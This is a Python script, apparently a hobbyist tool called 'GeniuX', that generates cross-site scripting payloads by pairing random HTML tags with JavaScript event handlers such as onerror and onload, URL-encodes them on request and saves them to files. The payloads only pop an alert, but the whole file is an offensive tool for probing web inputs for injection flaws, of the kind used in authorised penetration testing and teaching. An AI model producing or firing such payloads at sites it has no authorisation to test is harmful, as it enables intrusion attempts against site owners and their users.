import os
import random
import string
import html
from urllib.parse import quote  # Import URL encoding functions

# ANSI escape codes for colors
ORANGE = '\033[38;5;208m'  # Orange
GREEN = '\033[32m'         # Green
LIGHT_BLUE = '\033[94m'    # Light Blue
BLUE = '\033[34m'          # Blue
RESET = '\033[0m'          # Reset to default color
RED = '\033[31m'           # Red

# Default signature
DEFAULT_SIGNATURE = 'POC by: Bl4ck7'

# ASCII banner with colors
banner = f"""
{ORANGE} ██████╗ ███████╗███╗   ██╗██╗██╗   ██╗██╗  ██╗
██╔════╝ ██╔════╝████╗  ██║██║██║   ██║╚██╗██╔╝
██║  ███╗█████╗  ██╔██╗ ██║██║██║   ██║ ╚███╔╝ 
██║   ██║██╔══╝  ██║╚██╗██║██║██║   ██║ ██╔██╗ 
╚██████╔╝███████╗██║ ╚████║██║╚██████╔╝██╔╝ ██╗
 ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝
{RESET}
{GREEN}        GeniuX - XSS Payload Generator
        Developed by Mr.Bl4ck7
        GitHub: https://github.com/Mr-Bl4ck7{RESET}
"""

# Lists of HTML tags and JavaScript events
HTML_TAGS = ['div', 'img', 'script', 'iframe', 'svg', 'input', 'a', 'body', 'p', 'span', 'Bl4ck7']
JS_EVENTS = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'onmouseout', 'ondblclick']

# Helper functions
def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_payload(signature):
    tag = random.choice(HTML_TAGS)
    event = random.choice(JS_EVENTS)
    payload = f'<{tag} {event}="alert(\'{signature}\')">{random_string(random.randint(5, 15))}</{tag}>'
    return payload

def encode_payload(payload):
    return quote(payload)  # Use URL encoding

def generate_payloads(count, encode, signature):
    normal_payloads = []
    encoded_payloads = []

    for i in range(count):
        payload = random_payload(signature)
        normal_payloads.append(payload)
        if encode:
            encoded_payloads.append(encode_payload(payload))

        # Print live counter
        print(f'{RED}[!] {ORANGE}Generating Payloads: {i + 1}/{count}{RESET}', end='\r')

    return normal_payloads, encoded_payloads

def save_payloads(normal_payloads, encoded_payloads, count):
    if not os.path.exists('payloads'):
        os.makedirs('payloads')
    
    with open(f'payloads/{count}_normal_payload_GeniuX.txt', 'w') as normal_file:
        normal_file.write('\n'.join(normal_payloads))

    if encoded_payloads:
        with open(f'payloads/{count}_encoded_payload_GeniuX.txt', 'w') as encoded_file:
            encoded_file.write('\n'.join(encoded_payloads))

# Main function
def main():
    print(banner)
    
    # Signature setup
    custom_signature = DEFAULT_SIGNATURE
    add_signature = input(f"{LIGHT_BLUE}[+] {ORANGE}Do You Want To Add Your Specific Signature in The Payloads? (e.g., POC By: YourName) (yes/no) {RESET}").strip().lower()
    
    if add_signature == 'yes':
        custom_signature = input(f"{BLUE}  [-] {ORANGE}Enter Your Custom Signature (e.g., POC By: YourName): {RESET}").strip()
    
    while True:
        try:
            count = int(input(f"{LIGHT_BLUE}[+] {ORANGE}How Many Payloads Do You Need To Generate? {RESET}"))
            encode = input(f"{LIGHT_BLUE}[+] {ORANGE}Do You Want Encoded Version (yes/no)? {RESET}").strip().lower() == 'yes'

            normal_payloads, encoded_payloads = generate_payloads(count, encode, custom_signature)
            save_payloads(normal_payloads, encoded_payloads, count)

            print(f'\n{GREEN}[+] {ORANGE}Payloads Generated And Saved Successfully In The "payloads" Folder.{RESET}')
            break
        except ValueError:
            print(f'{RED}[!] Invalid Input. Please Enter A Valid Number For Payload Count.{RESET}')

if __name__ == "__main__":
    main()
